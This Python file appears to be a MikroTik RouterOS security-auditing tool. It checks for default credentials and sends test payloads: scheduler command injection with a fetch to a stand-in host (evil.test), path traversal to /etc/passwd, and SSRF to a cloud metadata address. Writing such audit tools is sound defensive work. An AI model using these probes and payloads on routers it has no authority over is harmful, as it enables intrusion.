#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Author: André Henrique (LinkedIn/X: @mrhenrike)

"""
MikroTik Live Security Auditor — MikrotikAPI-BF
==================================================
8-phase automated security audit via REST API + Winbox + SNMP.

Usage:
    from xpl.auditor import MikroTikAuditor
    auditor = MikroTikAuditor("192.168.88.1", "admin", "")
    results = auditor.run_full_audit()
    auditor.generate_report(results, Path("reports"))

Phases:
    1. System enumeration (identity, resource, packages, health)
    2. Service & network mapping (ip/service, firewall, interfaces)
    3. User & credential audit (blank password, default creds)
    4. REST API injection testing (scheduler, path traversal, SSRF)
    5. Winbox protocol probing (port 8291, M2 banner)
    6. SNMP analysis (default communities)
    7. Undocumented/debug endpoint discovery
    8. Configuration export & firewall audit
"""
from __future__ import annotations

import json
import logging
import socket
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional

import requests
from requests.auth import HTTPBasicAuth
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
log = logging.getLogger(__name__)


class MikroTikAuditor:
    """Automated 8-phase security auditor for MikroTik RouterOS.

    Args:
        host: Target IP address.
        user: REST API username.
        password: REST API password.
        timeout: HTTP request timeout in seconds.
    """

    def __init__(
        self,
        host: str,
        user: str = "admin",
        password: str = "",
        timeout: int = 10,
    ) -> None:
        self.host = host
        self.user = user
        self.password = password
        self.timeout = timeout
        self.base_url = f"http://{host}"
        self.rest_url = f"http://{host}/rest"
        self.auth = HTTPBasicAuth(user, password)
        self.findings: List[Dict[str, Any]] = []
        self.session = requests.Session()
        self.session.auth = self.auth
        self.session.verify = False
        self.session.timeout = timeout

    def _rest_get(self, endpoint: str) -> Any:
        """Authenticated REST GET returning parsed JSON or error dict."""
        try:
            r = self.session.get(f"{self.rest_url}{endpoint}", timeout=self.timeout)
            if r.status_code == 200:
                return r.json()
            return {"_status": r.status_code, "_body": r.text[:500]}
        except Exception as e:
            return {"_error": str(e)}

    def _rest_post(self, endpoint: str, data: dict) -> Optional[dict]:
        """Authenticated REST POST returning status dict."""
        try:
            r = self.session.post(f"{self.rest_url}{endpoint}", json=data, timeout=self.timeout)
            return {"_status": r.status_code, "_body": r.text[:500]}
        except Exception as e:
            return {"_error": str(e)}

    def _add_finding(
        self, fid: str, severity: str, title: str, detail: str, evidence: str = ""
    ) -> None:
        """Register an audit finding."""
        self.findings.append({
            "id": fid, "severity": severity, "title": title,
            "detail": detail, "evidence": evidence[:2000],
            "timestamp": datetime.now(timezone.utc).isoformat(),
        })
        tag = {"CRITICAL": "!!!", "HIGH": "!! ", "MEDIUM": "!  "}.get(severity, "   ")
        print(f"  [{tag}] {fid} ({severity}): {title}")

    # ── Phase 1 ──────────────────────────────────────────────────────────

    def enumerate_system(self) -> Dict[str, Any]:
        """Phase 1: System enumeration — identity, resource, packages, health."""
        print("\n[1/8] System Enumeration")
        info: Dict[str, Any] = {}
        endpoints = {
            "identity": "/system/identity",
            "resource": "/system/resource",
            "routerboard": "/system/routerboard",
            "packages": "/system/package",
            "license": "/system/license",
            "health": "/system/health",
            "clock": "/system/clock",
        }
        for key, ep in endpoints.items():
            data = self._rest_get(ep)
            info[key] = data
            ok = data and "_error" not in str(data) and "_status" not in str(data)
            print(f"  {key}: {'OK' if ok else 'FAIL'}")

        res = info.get("resource", {})
        if isinstance(res, dict) and "version" in res:
            print(
                f"  Version: {res.get('version','')} | "
                f"Arch: {res.get('architecture-name','')} | "
                f"Uptime: {res.get('uptime','')}"
            )
        return info

    # ── Phase 2 ──────────────────────────────────────────────────────────

    def enumerate_services(self) -> Dict[str, Any]:
        """Phase 2: Service & network mapping."""
        print("\n[2/8] Service & Network Mapping")
        info: Dict[str, Any] = {}
        svc_endpoints = {
            "ip_service": "/ip/service",
            "ip_address": "/ip/address",
            "ip_firewall_filter": "/ip/firewall/filter",
            "ip_firewall_nat": "/ip/firewall/nat",
            "interface": "/interface",
            "ip_dns": "/ip/dns",
            "ip_route": "/ip/route",
            "snmp": "/snmp",
        }
        for key, ep in svc_endpoints.items():
            data = self._rest_get(ep)
            info[key] = data
            if isinstance(data, list):
                print(f"  {key}: {len(data)} entries")
            else:
                print(f"  {key}: OK")

        services = info.get("ip_service", [])
        if isinstance(services, list):
            for svc in services:
                name = svc.get("name", "")
                disabled = svc.get("disabled", "true")
                port = svc.get("port", "")
                if disabled == "false" and name in ("telnet", "ftp"):
                    self._add_finding(
                        f"F-MT-SVC-{name.upper()}", "MEDIUM",
                        f"Insecure service '{name}' enabled on port {port}",
                        f"Service {name} transmits credentials in cleartext.",
                        json.dumps(svc),
                    )
                elif disabled == "false" and name == "api" and str(port) == "8728":
                    self._add_finding(
                        "F-MT-SVC-API-NOSSL", "MEDIUM",
                        "API service on port 8728 (no TLS)",
                        "API credentials sent in cleartext.",
                        json.dumps(svc),
                    )
        return info

    # ── Phase 3 ──────────────────────────────────────────────────────────

    def audit_users(self) -> Dict[str, Any]:
        """Phase 3: User & credential audit."""
        print("\n[3/8] User & Credential Audit")
        info: Dict[str, Any] = {}
        info["users"] = self._rest_get("/user")
        info["user_active"] = self._rest_get("/user/active")

        users = info.get("users", [])
        if isinstance(users, list):
            for u in users:
                name = u.get("name", "")
                group = u.get("group", "")
                print(f"  User: {name} | Group: {group}")

        try:
            r = requests.get(
                f"{self.rest_url}/system/identity",
                auth=HTTPBasicAuth("admin", ""),
                timeout=5, verify=False,
            )
            if r.status_code == 200:
                self._add_finding(
                    "F-MT-CRED-BLANK", "CRITICAL",
                    "Admin account has BLANK password",
                    "admin:'' authenticates via REST API. Full system compromise possible.",
                    f"HTTP {r.status_code}: {r.text[:200]}",
                )
        except Exception:
            pass

        for pwd in ("admin", "mikrotik", "password", "1234"):
            if pwd == self.password:
                continue
            try:
                r = requests.get(
                    f"{self.rest_url}/system/identity",
                    auth=HTTPBasicAuth("admin", pwd),
                    timeout=3, verify=False,
                )
                if r.status_code == 200:
                    self._add_finding(
                        f"F-MT-CRED-DEFAULT-{pwd.upper()}", "HIGH",
                        f"Admin uses default password '{pwd}'",
                        "Trivially guessable credential grants full access.",
                    )
                    break
            except Exception:
                pass
        return info

    # ── Phase 4 ──────────────────────────────────────────────────────────

    def test_rest_injection(self) -> Dict[str, Any]:
        """Phase 4: REST API injection & auth testing."""
        print("\n[4/8] REST API Injection & Auth Testing")
        results: Dict[str, Any] = {"tests": []}

        for payload in (';/tool/fetch url=http://evil.test/x', '$(id)', '`id`'):
            resp = self._rest_post("/system/scheduler/add", {
                "name": f"audit_inject_{abs(hash(payload)) % 10000}",
                "on-event": payload, "interval": "1d", "disabled": "true",
            })
            status = resp.get("_status") if resp else None
            results["tests"].append({"test": "scheduler-inject", "payload": payload, "status": status})
            if status and status in (200, 201):
                self._add_finding(
                    "F-MT-REST-SCHED-INJECT", "HIGH",
                    "Scheduler accepts dangerous on-event payload",
                    f"Payload '{payload[:50]}' accepted (HTTP {status}).",
                    str(resp)[:500],
                )
                self._rest_post("/system/scheduler/remove", {
                    ".id": f"audit_inject_{abs(hash(payload)) % 10000}",
                })

        for path in ("/system/../../etc/passwd", "/%2e%2e/%2e%2e/etc/passwd"):
            try:
                r = self.session.get(f"{self.base_url}/rest{path}", timeout=5)
                results["tests"].append({"test": "path-traversal", "path": path, "status": r.status_code})
                if r.status_code == 200 and ("root:" in r.text or "shadow" in r.text):
                    self._add_finding(
                        "F-MT-REST-TRAVERSAL", "CRITICAL",
                        f"REST API path traversal leaks system files at {path}",
                        f"Sensitive content in response.", r.text[:500],
                    )
            except Exception:
                pass

        for url in ("http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:80/"):
            resp = self._rest_post("/tool/fetch", {"url": url, "mode": "http", "dst-path": "/dev/null"})
            status = resp.get("_status") if resp else None
            if status and status in (200, 201):
                self._add_finding(
                    "F-MT-REST-SSRF", "HIGH",
                    f"tool/fetch SSRF: accepted {url[:60]}",
                    "Server-Side Request Forgery via /rest/tool/fetch.",
                    str(resp)[:500],
                )

        try:
            r = requests.get(f"{self.rest_url}/system/identity", timeout=5, verify=False)
            if r.status_code == 200:
                self._add_finding(
                    "F-MT-REST-NOAUTH", "CRITICAL",
                    "REST API accessible WITHOUT authentication",
                    "No credentials required.", f"HTTP {r.status_code}: {r.text[:200]}",
                )
        except Exception:
            pass

        return results

    # ── Phase 5 ──────────────────────────────────────────────────────────

    def probe_winbox(self) -> Dict[str, Any]:
        """Phase 5: Winbox protocol probing (port 8291)."""
        print("\n[5/8] Winbox Protocol Analysis (Port 8291)")
        results: Dict[str, Any] = {}
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((self.host, 8291))
            s.send(b"\x01\x00\x00\x00")
            resp = s.recv(1024)
            results["winbox_banner"] = resp.hex()
            print(f"  Winbox response: {len(resp)} bytes")
            self._add_finding(
                "F-MT-WINBOX-OPEN", "INFO",
                "Winbox port 8291 open and responding",
                "Winbox service reachable. M2 protocol active.",
                f"Banner: {resp[:32].hex()}",
            )
            s.close()
        except Exception as e:
            results["winbox_error"] = str(e)
            print(f"  Winbox probe failed: {e}")
        return results

    # ── Phase 6 ──────────────────────────────────────────────────────────

    def probe_snmp(self) -> Dict[str, Any]:
        """Phase 6: SNMP analysis."""
        print("\n[6/8] SNMP Analysis")
        results: Dict[str, Any] = {}
        communities = self._rest_get("/snmp/community")
        results["communities"] = communities
        if isinstance(communities, list):
            for comm in communities:
                name = comm.get("name", "")
                if name in ("public", "private"):
                    self._add_finding(
                        f"F-MT-SNMP-DEFAULT-{name.upper()}", "MEDIUM",
                        f"Default SNMP community '{name}' configured",
                        f"Allows enumeration with community string '{name}'.",
                        json.dumps(comm),
                    )
        return results

    # ── Phase 7 ──────────────────────────────────────────────────────────

    def probe_undocumented(self) -> Dict[str, Any]:
        """Phase 7: Undocumented/debug endpoint discovery."""
        print("\n[7/8] Probing Undocumented / Debug Endpoints")
        results: Dict[str, Any] = {"endpoints": []}
        hidden = [
            "/system/debug", "/system/console", "/devel", "/devel-login",
            "/tool/sniffer", "/tool/bandwidth-test", "/container",
            "/user/ssh-keys", "/certificate", "/ip/proxy", "/ip/socks",
            "/file", "/system/backup", "/system/history",
        ]
        for path in hidden:
            data = self._rest_get(path)
            status = data.get("_status") if isinstance(data, dict) else 200
            if status == 200 or (isinstance(data, list) and len(data) > 0):
                entry = {"path": path, "status": status}
                if isinstance(data, list):
                    entry["count"] = len(data)
                results["endpoints"].append(entry)
                print(f"  FOUND: {path} -> {entry.get('count', 'OK')}")
                if path in ("/devel", "/devel-login"):
                    self._add_finding(
                        f"F-MT-DEBUG-{path.split('/')[-1].upper()}", "CRITICAL",
                        f"Debug endpoint accessible: {path}",
                        f"Hidden development endpoint returns data via REST API.",
                        str(data)[:500],
                    )
            else:
                print(f"  {path} -> HTTP {status}")
        return results

    # ── Phase 8 ──────────────────────────────────────────────────────────

    def export_config(self) -> Dict[str, Any]:
        """Phase 8: Configuration export & firewall audit."""
        print("\n[8/8] Configuration Export & Firewall Audit")
        results: Dict[str, Any] = {}
        fw_filter = self._rest_get("/ip/firewall/filter")
        if isinstance(fw_filter, list) and len(fw_filter) == 0:
            self._add_finding(
                "F-MT-FW-EMPTY", "HIGH",
                "Firewall filter rules are EMPTY",
                "No firewall rules configured. All traffic is allowed.",
            )
        results["fw_filter_count"] = len(fw_filter) if isinstance(fw_filter, list) else 0
        results["fw_nat_count"] = 0
        fw_nat = self._rest_get("/ip/firewall/nat")
        if isinstance(fw_nat, list):
            results["fw_nat_count"] = len(fw_nat)
        return results

    # ── Orchestrator ─────────────────────────────────────────────────────

    def run_full_audit(self) -> Dict[str, Any]:
        """Execute all 8 audit phases and return consolidated results."""
        print(f"\n{'='*70}")
        print(f"  MIKROTIK LIVE SECURITY AUDIT")
        print(f"  Target: {self.host} | User: {self.user}")
        print(f"  Time: {datetime.now(timezone.utc).isoformat()}")
        print(f"{'='*70}")

        results: Dict[str, Any] = {
            "target": self.host,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "system": self.enumerate_system(),
            "services": self.enumerate_services(),
            "users": self.audit_users(),
            "rest_injection": self.test_rest_injection(),
            "winbox": self.probe_winbox(),
            "snmp": self.probe_snmp(),
            "undocumented": self.probe_undocumented(),
            "config": self.export_config(),
            "findings": self.findings,
        }

        print(f"\n{'='*70}")
        print(f"  AUDIT COMPLETE: {len(self.findings)} findings")
        for f in self.findings:
            print(f"    [{f['severity']:8s}] {f['id']}: {f['title'][:60]}")
        print(f"{'='*70}")

        return results

    def generate_report(self, results: Dict[str, Any], output_dir: Path) -> Path:
        """Generate markdown audit report.

        Args:
            results: Dict from run_full_audit().
            output_dir: Directory to write the report.

        Returns:
            Path to the generated report file.
        """
        output_dir.mkdir(parents=True, exist_ok=True)
        ts = datetime.now(timezone.utc).isoformat()[:19] + " UTC"
        report_path = output_dir / f"audit_{self.host.replace('.','_')}_{ts[:10]}.md"

        lines = [
            f"# MikroTik RouterOS — Live Security Audit Report",
            f"> Generated: {ts}",
            f"> Analyst: André Henrique (@mrhenrike) | União Geek",
            f"> Target: {self.host}",
            "", "---", "",
        ]

        res = results.get("system", {}).get("resource", {})
        if isinstance(res, dict) and "version" in res:
            lines += [
                "## System Information", "",
                "| Field | Value |",
                "|-------|-------|",
                f"| Version | `{res.get('version', '?')}` |",
                f"| Architecture | `{res.get('architecture-name', '?')}` |",
                f"| Board | `{res.get('board-name', '?')}` |",
                f"| Uptime | `{res.get('uptime', '?')}` |",
                "",
            ]

        crit = [f for f in self.findings if f["severity"] == "CRITICAL"]
        high = [f for f in self.findings if f["severity"] == "HIGH"]
        med = [f for f in self.findings if f["severity"] == "MEDIUM"]

        lines += [
            "## Findings Summary", "",
            "| Severity | Count |",
            "|----------|-------|",
            f"| CRITICAL | {len(crit)} |",
            f"| HIGH | {len(high)} |",
            f"| MEDIUM | {len(med)} |",
            f"| LOW/INFO | {len(self.findings) - len(crit) - len(high) - len(med)} |",
            f"| **Total** | **{len(self.findings)}** |",
            "", "## Detailed Findings", "",
        ]

        sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
        for f in sorted(self.findings, key=lambda x: sev_order.get(x["severity"], 9)):
            lines += [
                f"### {f['id']} — {f['severity']}", "",
                f"**{f['title']}**", "",
                f"{f['detail']}", "",
            ]

        lines += [
            "---",
            "*MikrotikAPI-BF Audit Engine*",
            "*André Henrique (@mrhenrike) | União Geek*",
        ]

        report_path.write_text("\n".join(lines), encoding="utf-8")

        json_path = output_dir / f"audit_{self.host.replace('.','_')}_raw.json"
        json_path.write_text(json.dumps(results, indent=2, default=str), encoding="utf-8")

        return report_path
